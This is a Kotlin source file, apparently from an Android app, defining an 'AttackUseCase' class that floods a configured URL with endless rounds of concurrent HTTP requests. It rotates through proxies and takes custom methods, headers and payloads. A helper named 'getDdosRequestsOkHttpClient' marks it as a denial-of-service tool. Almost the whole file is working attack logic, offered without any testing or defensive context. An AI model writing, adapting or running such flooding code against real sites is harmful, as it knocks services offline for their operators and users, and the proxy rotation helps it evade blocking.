package com.defense.attack.model.usecase

import android.util.Log
import com.defense.attack.model.api.RetrofitManager
import com.defense.attack.model.entity.data.AttackConfig
import com.defense.attack.model.entity.data.RequestResponse
import com.defense.attack.model.entity.data.proxy.ProxyInfo
import kotlinx.coroutines.*
import okhttp3.*
import java.util.*


class AttackUseCase {
    private val tag = AttackUseCase::class.java.simpleName
    private var proxyIndex = 0

    fun perform(
        coroutineScope: CoroutineScope,
        config: AttackConfig,
        asyncRequestCount: Int,
        handleRequestResponseCallback: (RequestResponse) -> Unit,
        handleRequestErrorCallback: (Throwable, ProxyInfo?) -> Unit
    ): Job {
        return coroutineScope.launch {
            while (true) {
                if (!coroutineContext.isActive) {
                    break
                }

                Log.d(tag, "***start async requests")

                (0 until asyncRequestCount).map {
                    async {
                        val proxy = getProxy(config.proxies, config.url)
                        try {
                            handleRequestResponseCallback(
                                performRequest(
                                    config.url,
                                    config.method.methodName,
                                    config.headers,
                                    config.contentType,
                                    config.payload,
                                    proxy
                                )
                            )
                        } catch (throwable: Throwable) {
                            handleRequestErrorCallback(throwable, proxy)
                        }
                    }
                }.forEach {
//                    it.await() // think if i need await, maybe just let them go. Better to wait for request ending.
                }

                Log.d(tag, "delay ${config.url}")
                delay(config.delayBetweenAllThreadsExecuted)
            }
        }
    }

    @Synchronized
    private fun getProxy(proxies: List<ProxyInfo>, websiteUrl: String): ProxyInfo? {
        if (proxies.isEmpty()) {
            return null
        }

        val proxy = proxies.getOrNull(proxyIndex)
        Log.d(tag, "getProxy url=$websiteUrl index=$proxyIndex proxy=${proxy?.url}:${proxy?.port}")
        proxyIndex++
        return proxy ?: kotlin.run {
            proxyIndex = 1 // 1 - because 0 we using in next line
            proxies[0]
        }
    }

    private suspend fun performRequest(
        url: String,
        method: String,
        headers: Map<String, String>,
        contentType: MediaType?,
        payload: String?,
        proxy: ProxyInfo?,
    ): RequestResponse = withContext(Dispatchers.IO) {
        Log.d(tag, "start attack $url proxy ${proxy?.url}:${proxy?.port}")

        count++
        Log.d("test", "count=$count")

        // maybe error on some content type
        val body: RequestBody? = if (method.toLowerCase(Locale.ROOT) == "get") {
            null
        } else {
            payload?.run { RequestBody.create(contentType, this) }
        }
        val request = Request.Builder()
            .url(url)
            .method(method, body)
            .apply {
                headers.keys.forEach { headerKey ->
                    headers[headerKey]?.let { header ->
                        addHeader(headerKey, header)
                    }
                }
            }
            .build()

        val okHttpClient = RetrofitManager.getDdosRequestsOkHttpClient(proxy)
        val response = okHttpClient.newCall(request).execute()

        val responseHeaders = hashMapOf<String, String>()
        response.headers().names().forEach {
            response.headers().get(it)?.let { header ->
                responseHeaders[it] = header
            }
        }

//        val respBody = response.body()?.string() ?: ""
        RequestResponse(
            response.code(),
            response.message(),
            url,
            proxy
        )
    }


    companion object {
        var count = 0
    }

}